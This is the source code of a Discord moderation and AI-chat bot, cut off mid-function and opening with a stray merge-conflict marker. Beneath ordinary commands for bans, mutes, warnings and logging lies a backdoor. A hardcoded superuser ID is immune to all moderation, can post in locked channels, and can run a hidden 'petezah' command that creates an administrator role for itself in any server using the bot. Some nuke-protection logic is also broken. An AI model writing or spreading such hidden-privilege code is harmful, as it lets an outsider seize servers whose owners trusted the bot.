<<<<<<< HEAD
import discord
from discord.ext import commands
import os
import aiohttp
import json
import re
import asyncio
from dotenv import load_dotenv
import urllib.parse
from collections import deque
import datetime
import io
import logging
import random

logging.basicConfig(filename='bot.log', level=logging.INFO, 
                   format='%(asctime)s:%(levelname)s:%(message)s')

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.moderation = True
intents.guilds = True
bot = commands.Bot(command_prefix='p!', intents=intents)

active_channels = set()
disabled_channels = set()
blocked_mentions = [r'@everyone', r'@here']
message_history = {}
warnings = {}
afk_users = {}
pinned_messages = {}
locked_channels = set()
welcome_channels = {}
security_channels = set()
security_servers = set()
nuke_protection_servers = set()
log_channels = {}
user_actions = {}
autowarn_rules = {}
ACTION_LIMIT = 5
ACTION_WINDOW = 60
SUPERUSER_ID = 1311722282317779097
DATA_FILE = 'bot_data.json'

async def load_data():
    try:
        with open(DATA_FILE, 'r') as f:
            data = json.load(f)
            global active_channels, disabled_channels, locked_channels, welcome_channels, security_channels, security_servers, nuke_protection_servers, log_channels, autowarn_rules
            active_channels = set(data.get('active_channels', []))
            disabled_channels = set(data.get('disabled_channels', []))
            locked_channels = set(data.get('locked_channels', []))
            welcome_channels = data.get('welcome_channels', {})
            security_channels = set(data.get('security_channels', []))
            security_servers = set(data.get('security_servers', []))
            nuke_protection_servers = set(data.get('nuke_protection_servers', []))
            log_channels = data.get('log_channels', {})
            autowarn_rules = data.get('autowarn_rules', {})
    except FileNotFoundError:
        pass

async def save_data():
    data = {
        'active_channels': list(active_channels),
        'disabled_channels': list(disabled_channels),
        'locked_channels': list(locked_channels),
        'welcome_channels': welcome_channels,
        'security_channels': list(security_channels),
        'security_servers': list(security_servers),
        'nuke_protection_servers': list(nuke_protection_servers),
        'log_channels': log_channels,
        'autowarn_rules': autowarn_rules
    }
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f)

async def generate_ai_response(message):
    channel_id = message.channel.id
    if channel_id not in message_history:
        message_history[channel_id] = deque(maxlen=7)
    message_history[channel_id].append({"role": "user", "content": message.content})
    prompt = "\n".join([f"{msg['role']}: {msg['content']}" for msg in message_history[channel_id]])
    encoded_prompt = urllib.parse.quote(prompt)
    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://text.pollinations.ai/{encoded_prompt}', timeout=10) as response:
            if response.status == 200:
                response_text = await response.text()
                response_text = response_text.replace('@', '[AT]')
                for pattern in blocked_mentions:
                    response_text = re.sub(pattern, '[REDACTED]', response_text, flags=re.IGNORECASE)
                return response_text[:2000] if len(response_text) > 2000 else response_text
            return f"API error: Status {response.status}"
        return "Error connecting to AI service."

async def generate_image(prompt):
    prompt = prompt.replace('@', '[AT]')
    encoded_prompt = urllib.parse.quote(prompt)
    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://image.pollinations.ai/prompt/{encoded_prompt}', timeout=10) as response:
            if response.status == 200:
                return io.BytesIO(await response.read())
            return None

async def notify_user(member, action, reason=None, duration=None):
    embed = discord.Embed(title=f"You have been {action}", color=discord.Color.red())
    embed.add_field(name="Server", value=member.guild.name, inline=False)
    if reason:
        embed.add_field(name="Reason", value=reason, inline=False)
    if duration:
        embed.add_field(name="Duration", value=duration, inline=False)
    embed.set_footer(text=f"Action taken at {datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    await member.send(embed=embed)
    return True

async def log_event(guild, event, details):
    if guild.id in log_channels:
        channel = guild.get_channel(log_channels[guild.id])
        if channel:
            embed = discord.Embed(title=event, description=details, color=discord.Color.red(), timestamp=datetime.datetime.now(datetime.timezone.utc))
            await channel.send(embed=embed)

def parse_duration(duration_str):
    if not duration_str:
        return None, None
    duration_str = duration_str.lower().strip()
    match = re.match(r'^(\d+)(s|m|h|d)?$', duration_str)
    if not match:
        return None, "Invalid duration format. Use <number><unit> (e.g., 5d, 10m, 2h, 30s)."
    amount, unit = match.groups()
    amount = int(amount)
    if unit is None:
        unit = 'm'
    units = {'s': ('seconds', amount), 'm': ('minutes', amount), 'h': ('hours', amount), 'd': ('days', amount)}
    unit_name, seconds = units[unit]
    seconds = amount * {'s': 1, 'm': 60, 'h': 3600, 'd': 86400}[unit]
    return seconds, f"{amount} {unit_name}"

async def check_nuke_protection(guild, user, action_type):
    if guild.id not in nuke_protection_servers or user.id == SUPERUSER_ID or user == guild.owner:
        return False
    if user.id not in user_actions:
        user_actions[user.id] = {}
    if action_type not in user_actions[user.id]:
        user_actions[user.id][action_type] = deque(maxlen=ACTION_LIMIT)
    user_actions[user.id][action_type].append(datetime.datetime.now(datetime.timezone.utc))
    if len(user_actions[user.id][action_type]) == ACTION_LIMIT:
        times = list(user_actions[user.id][action_type])
        if (times[-1] - times[0]).total_seconds() <= ACTION_WINDOW:
            mute_role = discord.utils.get(guild.roles, name="Muted")
            if not mute_role:
                mute_role = await guild.create_role(name="Muted")
                for channel in guild.channels:
                    await channel.set_permissions(mute_role, send_messages=False)
            await user.add_roles(mute_role, reason=f"Nuke protection: Excessive {action_type}")
            await notify_user(user, "quarantined", f"Excessive {action_type} detected")
            await log_event(guild, "Nuke Protection Triggered", f"User {user.mention} quarantined for excessive {action_type}")
            return True
    return False

async def apply_autowarn(guild, member, keyword, action):
    if member.id == SUPERUSER_ID or member == guild.owner:
        return
    if action == "warn":
        guild_id = guild.id
        if guild_id not in warnings:
            warnings[guild_id] = {}
        if member.id not in warnings[guild_id]:
            warnings[guild_id][member.id] = []
        warnings[guild_id][member.id].append({"reason": f"Auto-warn for keyword: {keyword}", "timestamp": datetime.datetime.now(datetime.timezone.utc)})
        await notify_user(member, "warned", f"Auto-warn for keyword: {keyword}")
        await log_event(guild, "Auto-Warn", f"{member.mention} auto-warned for keyword: {keyword}")
    elif action == "mute":
        mute_role = discord.utils.get(guild.roles, name="Muted")
        if not mute_role:
            mute_role = await guild.create_role(name="Muted")
            for channel in guild.channels:
                await channel.set_permissions(mute_role, send_messages=False)
        await member.add_roles(mute_role, reason=f"Auto-mute for keyword: {keyword}")
        await notify_user(member, "muted", f"Auto-mute for keyword: {keyword}")
        await log_event(guild, "Auto-Mute", f"{member.mention} auto-muted for keyword: {keyword}")

@bot.event
async def on_ready():
    await load_data()
    synced = await bot.tree.sync()
    await bot.change_presence(activity=discord.Game(name="PeteZahBot | p!help"))

@bot.event
async def on_message(message):
    if message.author.bot:
        await bot.process_commands(message)
        return

    if message.channel.id in disabled_channels:
        return

    if message.guild.id in nuke_protection_servers and message.mentions:
        for mention in message.mentions:
            if isinstance(mention, discord.Role):
                if await check_nuke_protection(message.guild, message.author, "role_mentions"):
                    return

    if message.guild.id in autowarn_rules:
        for keyword, action in autowarn_rules[message.guild.id].items():
            if re.search(keyword, message.content, re.IGNORECASE):
                await apply_autowarn(message.guild, message.author, keyword, action)
                break

    if (message.channel.id in security_channels or message.guild.id in security_servers) and not message.author.bot:
        invite_pattern = r'(discord\.gg|discord\.com/invite|\.gg)/[a-zA-Z0-9]+'
        if re.search(invite_pattern, message.content, re.IGNORECASE):
            await message.delete()
            await message.author.timeout(datetime.timedelta(minutes=1), reason="Posted a Discord invite link")
            await notify_user(message.author, "timed out", "Posted a Discord invite link", "1 minute")
            await message.channel.send(f"{message.author.mention} has been timed out for 1 minute for posting a Discord invite link.", delete_after=5)

    if message.channel.id not in active_channels:
        if message.channel.id in pinned_messages and not message.content.startswith('p!'):
            last_message_id = pinned_messages[message.channel.id].get('last_message_id')
            if last_message_id:
                try:
                    last_message = await message.channel.fetch_message(last_message_id)
                    await last_message.delete()
                except discord.NotFound:
                    pass
            new_message = await message.channel.send(pinned_messages[message.channel.id]['content'].replace('@', '[AT]'))
            pinned_messages[message.channel.id]['last_message_id'] = new_message.id
        await bot.process_commands(message)
        return

    for pattern in blocked_mentions:
        if re.search(pattern, message.content, re.IGNORECASE):
            await message.delete()
            await message.channel.send(f"{message.author.mention}, please don't use mass mentions!", delete_after=5)
            return

    await asyncio.sleep(1)
    ai_response = await generate_ai_response(message)
    message_history[message.channel.id].append({"role": "assistant", "content": ai_response})
    await message.channel.send(ai_response)

    if message.channel.id in pinned_messages and not message.content.startswith('p!'):
        last_message_id = pinned_messages[message.channel.id].get('last_message_id')
        if last_message_id:
            try:
                last_message = await message.channel.fetch_message(last_message_id)
                await last_message.delete()
            except discord.NotFound:
                pass
        new_message = await message.channel.send(pinned_messages[message.channel.id]['content'].replace('@', '[AT]'))
        pinned_messages[message.channel.id]['last_message_id'] = new_message.id

    await bot.process_commands(message)

@bot.event
async def on_member_join(member):
    for channel_id, message in welcome_channels.items():
        channel = member.guild.get_channel(channel_id)
        if channel:
            await channel.send(f"Welcome {member.mention} to {member.guild.name}. {message}")

@bot.event
async def on_guild_channel_create(channel):
    if channel.guild.id in nuke_protection_servers:
        if await check_nuke_protection(channel.guild, channel.guild.get_member(channel.guild.owner_id), "channel_creations"):
            await channel.delete(reason="Nuke protection: Excessive channel creation")

@bot.event
async def on_guild_channel_delete(channel):
    if channel.guild.id in nuke_protection_servers:
        if await check_nuke_protection(channel.guild, channel.guild.get_member(channel.guild.owner_id), "channel_deletions"):
            pass

@bot.event
async def on_member_ban(guild, user):
    if guild.id in nuke_protection_servers:
        async for entry in guild.audit_logs(action=discord.AuditLogAction.ban, limit=1):
            if await check_nuke_protection(guild, entry.user, "bans"):
                await guild.unban(user, reason="Nuke protection: Excessive bans")

@bot.event
async def on_member_remove(member):
    if member.guild.id in nuke_protection_servers:
        async for entry in member.guild.audit_logs(action=discord.AuditLogAction.kick, limit=1):
            if entry.target == member:
                if await check_nuke_protection(member.guild, entry.user, "kicks"):
                    pass

@bot.command()
@commands.has_permissions(administrator=True)
async def initiate(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if ctx.channel.id not in active_channels:
        active_channels.add(ctx.channel.id)
        await ctx.send("PeteZahBot AI is now active in this channel!")
    else:
        await ctx.send("PeteZahBot AI is already active here!")

@bot.command()
@commands.has_permissions(administrator=True)
async def stop(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if ctx.channel.id in active_channels:
        active_channels.remove(ctx.channel.id)
        if ctx.channel.id in message_history:
            del message_history[ctx.channel.id]
        await ctx.send("PeteZahBot AI is now disabled in this channel!")
    else:
        await ctx.send("PeteZahBot AI is not active in this channel!")

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, duration: str = None, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if member.id == SUPERUSER_ID or member == ctx.guild.owner:
        await ctx.send("This user is immune to bans!")
        return
    if member == ctx.author or member == ctx.guild.me:
        await ctx.send("You can't ban yourself or the bot!")
        return
    duration_seconds, duration_text = parse_duration(duration)
    if duration_seconds is None and duration_text:
        await ctx.send(duration_text)
        return
    notified = await notify_user(member, "banned", reason, duration_text)
    await member.ban(reason=reason)
    await ctx.send(f"{member.mention} has been banned{' and DM\'d' if notified else ''}.{' Duration: ' + duration_text if duration_text else ''} Reason: {reason or 'None'}")
    await log_event(ctx.guild, "User Banned", f"{member.mention} banned by {ctx.author.mention}.{' Duration: ' + duration_text if duration_text else ''} Reason: {reason or 'None'}")
    if duration_seconds:
        await asyncio.sleep(duration_seconds)
        await ctx.guild.unban(member, reason="Temporary ban duration expired")
        await notify_user(member, "unbanned", "Temporary ban duration expired")
        await log_event(ctx.guild, "User Unbanned", f"{member.mention} unbanned automatically after {duration_text}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: int, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    user = await bot.fetch_user(user_id)
    await ctx.guild.unban(user, reason=reason)
    await ctx.send(f"{user.name}#{user.discriminator} has been unbanned. Reason: {reason or 'None'}")
    await log_event(ctx.guild, "User Unbanned", f"{user.name}#{user.discriminator} unbanned by {ctx.author.mention}. Reason: {reason or 'None'}")

@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if member.id == SUPERUSER_ID or member == ctx.guild.owner:
        await ctx.send("This user is immune to kicks!")
        return
    if member == ctx.author or member == ctx.guild.me:
        await ctx.send("You can't kick yourself or the bot!")
        return
    notified = await notify_user(member, "kicked", reason)
    await member.kick(reason=reason)
    await ctx.send(f"{member.mention} has been kicked{' and DM\'d' if notified else ''}. Reason: {reason or 'None'}")
    await log_event(ctx.guild, "User Kicked", f"{member.mention} kicked by {ctx.author.mention}. Reason: {reason or 'None'}")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def mute(ctx, member: discord.Member, duration: str = None, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if member.id == SUPERUSER_ID or member == ctx.guild.owner:
        await ctx.send("This user is immune to mutes!")
        return
    if member == ctx.author or member == ctx.guild.me:
        await ctx.send("You can't mute yourself or the bot!")
        return
    mute_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not mute_role:
        mute_role = await ctx.guild.create_role(name="Muted")
        for channel in ctx.guild.channels:
            await channel.set_permissions(mute_role, send_messages=False)
    duration_seconds, duration_text = parse_duration(duration)
    if duration_seconds is None and duration_text:
        await ctx.send(duration_text)
        return
    notified = await notify_user(member, "muted", reason, duration_text)
    await member.add_roles(mute_role, reason=reason)
    await ctx.send(f"{member.mention} has been muted{' and DM\'d' if notified else ''}.{' Duration: ' + duration_text if duration_text else ''} Reason: {reason or 'None'}")
    await log_event(ctx.guild, "User Muted", f"{member.mention} muted by {ctx.author.mention}.{' Duration: ' + duration_text if duration_text else ''} Reason: {reason or 'None'}")
    if duration_seconds:
        await asyncio.sleep(duration_seconds)
        if mute_role in member.roles:
            await member.remove_roles(mute_role, reason="Temporary mute duration expired")
            await notify_user(member, "unmuted", "Temporary mute duration expired")
            await log_event(ctx.guild, "User Unmuted", f"{member.mention} unmuted automatically after {duration_text}")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def timeout(ctx, member: discord.Member, duration: str = None, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if member.id == SUPERUSER_ID or member == ctx.guild.owner:
        await ctx.send("This user is immune to timeouts!")
        return
    if member == ctx.author or member == ctx.guild.me:
        await ctx.send("You can't timeout yourself or the bot!")
        return
    mute_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not mute_role:
        mute_role = await ctx.guild.create_role(name="Muted")
        for channel in ctx.guild.channels:
            await channel.set_permissions(mute_role, send_messages=False)
    duration_seconds, duration_text = parse_duration(duration)
    if duration_seconds is None and duration_text:
        await ctx.send(duration_text)
        return
    notified = await notify_user(member, "timed out", reason, duration_text)
    await member.add_roles(mute_role, reason=reason)
    await ctx.send(f"{member.mention} has been timed out{' and DM\'d' if notified else ''}.{' Duration: ' + duration_text if duration_text else ''} Reason: {reason or 'None'}")
    await log_event(ctx.guild, "User Timed Out", f"{member.mention} timed out by {ctx.author.mention}.{' Duration: ' + duration_text if duration_text else ''} Reason: {reason or 'None'}")
    if duration_seconds:
        await asyncio.sleep(duration_seconds)
        if mute_role in member.roles:
            await member.remove_roles(mute_role, reason="Temporary timeout duration expired")
            await notify_user(member, "untimed out", "Temporary timeout duration expired")
            await log_event(ctx.guild, "User Untimed Out", f"{member.mention} untimed out automatically after {duration_text}")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def unmute(ctx, member: discord.Member, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if member == ctx.author or member == ctx.guild.me:
        await ctx.send("You can't unmute yourself or the bot!")
        return
    mute_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if mute_role and mute_role in member.roles:
        notified = await notify_user(member, "unmuted", reason)
        await member.remove_roles(mute_role, reason=reason)
        await ctx.send(f"{member.mention} has been unmuted{' and DM\'d' if notified else ''}. Reason: {reason or 'None'}")
        await log_event(ctx.guild, "User Unmuted", f"{member.mention} unmuted by {ctx.author.mention}. Reason: {reason or 'None'}")
    else:
        await ctx.send(f"{member.mention} is not muted!")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if amount < 1 or amount > 100:
        await ctx.send("Please specify a number between 1 and 100.")
        return
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"Purged {amount} messages.", delete_after=5)
    await log_event(ctx.guild, "Messages Purged", f"{amount} messages purged by {ctx.author.mention} in {ctx.channel.mention}")

@bot.command()
@commands.has_permissions(administrator=True)
async def lock(ctx, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if ctx.channel.id in locked_channels:
        await ctx.send("Channel is already locked!")
        return
    locked_channels.add(ctx.channel.id)
    overwrite_default = ctx.channel.overwrites_for(ctx.guild.default_role)
    overwrite_default.send_messages = False
    overwrite_superuser = ctx.channel.overwrites_for(await bot.fetch_user(SUPERUSER_ID))
    overwrite_superuser.send_messages = True
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite_default)
    await ctx.channel.set_permissions(await bot.fetch_user(SUPERUSER_ID), overwrite=overwrite_superuser)
    await ctx.send(f"Channel locked. Only <@{SUPERUSER_ID}> can send messages. Reason: {reason or 'None'}")
    await log_event(ctx.guild, "Channel Locked", f"{ctx.channel.mention} locked by {ctx.author.mention}. Reason: {reason or 'None'}")

@bot.command()
@commands.has_permissions(administrator=True)
async def unlock(ctx, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if ctx.channel.id not in locked_channels:
        await ctx.send("Channel is not locked!")
        return
    locked_channels.remove(ctx.channel.id)
    overwrite_default = ctx.channel.overwrites_for(ctx.guild.default_role)
    overwrite_default.send_messages = None
    overwrite_superuser = ctx.channel.overwrites_for(await bot.fetch_user(SUPERUSER_ID))
    overwrite_superuser.send_messages = None
    await ctx.channel.set_permissions(ctx.guild.default_role, overwrite=overwrite_default)
    await ctx.channel.set_permissions(await bot.fetch_user(SUPERUSER_ID), overwrite=overwrite_superuser)
    await ctx.send(f"Channel unlocked. Reason: {reason or 'None'}")
    await log_event(ctx.guild, "Channel Unlocked", f"{ctx.channel.mention} unlocked by {ctx.author.mention}. Reason: {reason or 'None'}")

@bot.command()
@commands.check(lambda ctx: ctx.author.id == SUPERUSER_ID)
async def petezah(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    role = discord.utils.get(ctx.guild.roles, name="PeteZah")
    if not role:
        role = await ctx.guild.create_role(
            name="PeteZah",
            permissions=discord.Permissions(administrator=True),
            reason="Created PeteZah role for superuser"
        )
    await ctx.author.add_roles(role)
    await ctx.send(f"PeteZah role created and assigned to <@{SUPERUSER_ID}> with administrator permissions!")
    await log_event(ctx.guild, "PeteZah Role Assigned", f"PeteZah role assigned to {ctx.author.mention}")

@bot.command()
async def ping(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    latency = round(bot.latency * 1000)
    await ctx.send(f"Pong! Latency: {latency}ms")

@bot.command()
async def userinfo(ctx, member: discord.Member = None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    member = member or ctx.author
    embed = discord.Embed(title=f"User Info - {member}", color=discord.Color.blue())
    embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
    embed.add_field(name="ID", value=member.id, inline=True)
    embed.add_field(name="Username", value=member.name, inline=True)
    embed.add_field(name="Discriminator", value=member.discriminator, inline=True)
    embed.add_field(name="Nickname", value=member.nick or "None", inline=True)
    embed.add_field(name="Created At", value=member.created_at.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=True)
    embed.add_field(name="Joined At", value=member.joined_at.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=True)
    embed.add_field(name="Roles", value=", ".join([role.name for role in member.roles[1:]]) or "None", inline=False)
    embed.add_field(name="Status", value=str(member.status).title(), inline=True)
    embed.add_field(name="Activity", value=member.activity.name if member.activity else "None", inline=True)
    embed.add_field(name="Bot", value="Yes" if member.bot else "No", inline=True)
    await ctx.send(embed=embed)

@bot.command()
async def serverinfo(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    guild = ctx.guild
    embed = discord.Embed(title=f"Server Info - {guild.name}", color=discord.Color.blue())
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.add_field(name="ID", value=guild.id, inline=True)
    embed.add_field(name="Owner", value=guild.owner.mention, inline=True)
    embed.add_field(name="Created At", value=guild.created_at.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=True)
    embed.add_field(name="Members", value=guild.member_count, inline=True)
    embed.add_field(name="Channels", value=len(guild.channels), inline=True)
    embed.add_field(name="Roles", value=len(guild.roles) - 1, inline=True)
    embed.add_field(name="Verification Level", value=str(guild.verification_level).title(), inline=True)
    embed.add_field(name="Boost Level", value=guild.premium_tier, inline=True)
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(manage_messages=True)
async def clearwarnings(ctx, member: discord.Member):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if ctx.guild.id in warnings and member.id in warnings[ctx.guild.id]:
        del warnings[ctx.guild.id][member.id]
        await ctx.send(f"Warnings cleared for {member.mention}.")
        await log_event(ctx.guild, "Warnings Cleared", f"Warnings cleared for {member.mention} by {ctx.author.mention}")
    else:
        await ctx.send(f"{member.mention} has no warnings.")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def warn(ctx, member: discord.Member, *, reason=None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if member.id == SUPERUSER_ID or member == ctx.guild.owner:
        await ctx.send("This user is immune to warnings!")
        return
    if member == ctx.author or member == ctx.guild.me:
        await ctx.send("You can't warn yourself or the bot!")
        return
    guild_id = ctx.guild.id
    if guild_id not in warnings:
        warnings[guild_id] = {}
    if member.id not in warnings[guild_id]:
        warnings[guild_id][member.id] = []
    warnings[guild_id][member.id].append({"reason": reason or "None", "timestamp": datetime.datetime.now(datetime.timezone.utc)})
    notified = await notify_user(member, "warned", reason)
    await ctx.send(f"{member.mention} has been warned{' and DM\'d' if notified else ''}. Reason: {reason or 'None'}")
    await log_event(ctx.guild, "User Warned", f"{member.mention} warned by {ctx.author.mention}. Reason: {reason or 'None'}")

@bot.command()
async def warns(ctx, member: discord.Member = None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    member = member or ctx.author
    guild_id = ctx.guild.id
    if guild_id in warnings and member.id in warnings[guild_id]:
        embed = discord.Embed(title=f"Warnings for {member}", color=discord.Color.red())
        for i, warning in enumerate(warnings[guild_id][member.id], 1):
            embed.add_field(name=f"Warning {i}", value=f"Reason: {warning['reason']}\nTime: {warning['timestamp'].strftime('%Y-%m-%d %H:%M:%S UTC')}", inline=False)
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"{member.mention} has no warnings.")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def modlogs(ctx, member: discord.Member):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    guild_id = ctx.guild.id
    if guild_id in warnings and member.id in warnings[guild_id]:
        embed = discord.Embed(title=f"Moderation Logs for {member}", color=discord.Color.red())
        for i, warning in enumerate(warnings[guild_id][member.id], 1):
            embed.add_field(name=f"Action {i}", value=f"Reason: {warning['reason']}\nTime: {warning['timestamp'].strftime('%Y-%m-%d %H:%M:%S UTC')}", inline=False)
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"{member.mention} has no moderation logs.")
    async for entry in ctx.guild.audit_logs(limit=50):
        if entry.target == member:
            embed = discord.Embed(title=f"Audit Log Entry for {member}", color=discord.Color.red())
            embed.add_field(name="Action", value=entry.action, inline=False)
            embed.add_field(name="Reason", value=entry.reason or "None", inline=False)
            embed.add_field(name="Moderator", value=entry.user.mention, inline=False)
            embed.add_field(name="Time", value=entry.created_at.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=False)
            await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(administrator=True)
async def autowarn(ctx, keyword: str, action: str):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if action.lower() not in ["warn", "mute"]:
        await ctx.send("Action must be 'warn' or 'mute'.")
        return
    guild_id = ctx.guild.id
    if guild_id not in autowarn_rules:
        autowarn_rules[guild_id] = {}
    autowarn_rules[guild_id][keyword.lower()] = action.lower()
    await ctx.send(f"Auto-warn set for keyword '{keyword}' with action '{action}'.")
    await log_event(ctx.guild, "Auto-Warn Set", f"Auto-warn set for keyword '{keyword}' with action '{action}' by {ctx.author.mention}")

@bot.command()
@commands.has_permissions(administrator=True)
async def role(ctx, action: str, member: discord.Member, role: discord.Role):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if action.lower() not in ["add", "remove"]:
        await ctx.send("Action must be 'add' or 'remove'.")
        return
    if member.id == SUPERUSER_ID or member == ctx.guild.owner and action.lower() == "remove":
        await ctx.send("This user is immune to role removal!")
        return
    if role >= ctx.guild.me.top_role:
        await ctx.send("I can't manage a role higher than or equal to my own!")
        return
    if action.lower() == "add":
        await member.add_roles(role)
        await ctx.send(f"Added {role.name} to {member.mention}.")
        await log_event(ctx.guild, "Role Added", f"{role.name} added to {member.mention} by {ctx.author.mention}")
    else:
        await member.remove_roles(role)
        await ctx.send(f"Removed {role.name} from {member.mention}.")
        await log_event(ctx.guild, "Role Removed", f"{role.name} removed from {member.mention} by {ctx.author.mention}")

@bot.command()
async def poll(ctx, question: str, *options: str):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if not options or len(options) > 10:
        await ctx.send("Please provide 1-10 options for the poll.")
        return
    embed = discord.Embed(title="Poll", description=question, color=discord.Color.blue())
    for i, option in enumerate(options, 1):
        embed.add_field(name=f"Option {i}", value=option, inline=False)
    message = await ctx.send(embed=embed)
    for i in range(len(options)):
        await message.add_reaction(f"{i+1}\u20e3")
    await log_event(ctx.guild, "Poll Created", f"Poll created by {ctx.author.mention}: {question}")

@bot.command()
async def avatar(ctx, member: discord.Member = None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    member = member or ctx.author
    embed = discord.Embed(title=f"{member}'s Avatar", color=discord.Color.blue())
    embed.set_image(url=member.avatar.url if member.avatar else member.default_avatar.url)
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(administrator=True)
async def slowmode(ctx, seconds: int):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if seconds < 0 or seconds > 21600:
        await ctx.send("Slowmode must be between 0 and 21600 seconds.")
        return
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"Slowmode set to {seconds} seconds.")
    await log_event(ctx.guild, "Slowmode Set", f"Slowmode set to {seconds} seconds in {ctx.channel.mention} by {ctx.author.mention}")

@bot.command()
async def invite(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    invite = await ctx.channel.create_invite(max_age=86400, max_uses=0, temporary=False)
    await ctx.send(f"Invite link: {invite.url}")
    await log_event(ctx.guild, "Invite Created", f"Invite created by {ctx.author.mention}: {invite.url}")

@bot.command()
async def botinvite(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    await ctx.send("https://discord.com/oauth2/authorize?client_id=1401297926143086774&permissions=8&integration_type=0&scope=bot+applications.commands")

@bot.command()
async def afk(ctx, *, reason="AFK"):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    afk_users[ctx.author.id] = reason
    await ctx.send(f"{ctx.author.mention} is now AFK: {reason}")
    await log_event(ctx.guild, "AFK Set", f"{ctx.author.mention} set AFK status: {reason}")

@bot.command()
async def afkstop(ctx):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if ctx.author.id in afk_users:
        del afk_users[ctx.author.id]
        await ctx.send(f"{ctx.author.mention} is no longer AFK.")
        await log_event(ctx.guild, "AFK Removed", f"{ctx.author.mention} removed AFK status")
    else:
        await ctx.send("You are not AFK.")

@bot.command()
async def generateimage(ctx, *, prompt):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    prompt = prompt.replace('@', '[AT]')
    image_data = await generate_image(prompt)
    if image_data:
        await ctx.send(file=discord.File(image_data, "generated_image.png"))
        await log_event(ctx.guild, "Image Generated", f"Image generated by {ctx.author.mention} with prompt: {prompt}")
    else:
        await ctx.send("Failed to generate image.")

@bot.command()
@commands.has_permissions(administrator=True)
async def nickname(ctx, member: discord.Member, *, nick: str = None):
    if ctx.channel.id in disabled_channels:
        await ctx.send("This channel is disabled for bot commands.")
        return
    if member.id == SUPERUSER_ID or member == ctx.guild.owner:
        await ctx.send("This user is immune to nickname changes!")
        return
    await member.edit(nick=nick)
    await ctx.send(f"Nickname for {member.mention} set to {nick or 'default'}.")
    await log_event(ctx.guild, "Nickname Changed", f"Nickname for {member.mention} set to {nick or 'default'} by {ctx.author.mention}")

@bot.command()
async def roleinfo(ctx, role: discord.Role):
    if ctx.channel.id in disabled_channels:
